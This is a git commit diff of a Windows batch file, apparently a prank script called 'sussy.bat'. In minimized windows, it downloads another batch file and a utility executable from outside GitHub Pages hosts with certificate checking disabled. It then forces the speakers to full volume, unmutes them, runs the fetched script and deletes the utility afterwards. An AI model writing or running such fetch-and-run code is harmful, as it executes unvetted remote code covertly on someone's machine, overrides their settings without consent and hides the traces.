a086da067937043af1404ea4011db07cc0a5e8a4
stivengiv <94831607+stivengiv@users.noreply.github.com>
2022-05-20 09:51:36 +0200

    Add files via upload

--- sussy.bat
+++ sussy.bat
@@ -1,8 +1,10 @@
 @echo off
-start /wait /min "" cmd /c curl -kLOS stivengiv.github.io/p/play.bat -O aritz331.github.io/stuff/nircmdc.exe
+start /wait /min "" cmd /c curl -kLOs stivengiv.github.io/p/play.bat
+start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/nircmdc.exe
 
-nircmdc setdefaultsounddevice "Speakers"
-nircmdc setvolume 0 65535 65535
+start /min "" cmd /c nircmdc setdefaultsounddevice "Speakers"
+start /min "" cmd /c nircmdc setvolume 0 65535 65535
+start /min "" cmd /c nircmdc mutesysvolume 0
 
 start %temp%\play.bat aser
-del /f /q nircmdc.exe play.bat
+del /f /q nircmdc.exe
